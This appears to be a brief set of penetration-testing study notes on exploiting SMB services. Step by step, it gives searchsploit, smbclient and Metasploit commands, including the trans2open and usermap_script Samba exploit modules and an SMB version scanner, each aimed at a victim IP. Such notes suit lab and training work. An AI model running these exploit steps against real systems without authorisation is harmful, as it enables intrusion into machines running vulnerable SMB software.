# SMB Exploitation Process

1. **Search for Exploits**
   - Use `searchsploit` to find exploits for the SMB version:
     ```sh
     searchsploit samba2.2
     ```
   - Start Metasploit Console:
     ```sh
     msfconsole
     ```
   - Search for exploit module:
     ```sh
     search trans2open
     ```
   - Use the exploit module:
     ```sh
     use 1
     ```
   - Show options and set target IP:
     ```sh
     show options
     set RHOST {ip address of victim}
     ```

2. **Access File Share**
   - Use smbclient to list shares:
     ```sh
     smbclient -L {ip address}
     ```

3. **Scan SMB with Auxiliary**
   - Search for SMB version scanner:
     ```sh
     search smb_version
     ```
   - Use auxiliary scanner module:
     ```sh
     use auxiliary/scanner/smb/smb_version
     ```
   - Set target IP and run the exploit:
     ```sh
     set RHOSTS {ip address of target}
     exploit
     ```

4. **Find Exploits on Google for SMB**
   - Use Google to search for exploits:
     ```
     Windows XP SP3 exploit
     ```
   - Look for exploit pages on Rapid7 or Exploit-DB.
   - Follow the steps provided on the exploit page.

5. **Exploiting SMB with Metasploit**
   - Start Metasploit Console and PostgreSQL service:
     ```sh
     msfconsole
     service postgresql start
     ```
   - Use the exploit module:
     ```sh
     use exploit/multi/samba/usermap_script
     ```
   - Set target IP and run the exploit:
     ```sh
     set RHOSTS {IP ADDRESS}
     show targets
     run
     ```
